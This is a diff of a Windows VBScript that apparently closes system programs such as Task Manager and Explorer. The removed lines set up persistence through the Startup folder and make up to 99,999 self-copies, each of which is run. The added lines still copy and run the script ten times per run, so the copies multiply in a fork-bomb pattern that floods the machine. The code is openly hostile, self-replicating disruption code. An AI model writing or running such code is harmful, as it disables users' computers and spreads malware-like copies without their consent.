@@ -2,23 +2,11 @@ Set WshShell = WScript.CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")
 
-' Add script to Startup folder
-strStartupPath = WshShell.SpecialFolders("Startup")
-Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
-objShellLink.TargetPath = WScript.ScriptFullName
-objShellLink.Save
-
-' Copy script to Documents folder
-strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
-strScriptName = fso.GetFileName(WScript.ScriptFullName)
-
-' Create 10 copies of the script in the Documents folder
-For i = 1 to 99999
-    strCopyName = "Copy" & i & "_" & strScriptName
-    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & strCopyName, True
-    
-    ' Execute each copy of the script
-    WshShell.Run strDocumentsPath & "\" & strCopyName, 1, false
+For i = 1 To 10
+    ' Copy script to Documents folder and run the copy
+    strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
+    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & "Copy" & i & ".vbs", True
+    WshShell.Run strDocumentsPath & "\" & "Copy" & i & ".vbs", 1, False
 Next
 
 Do
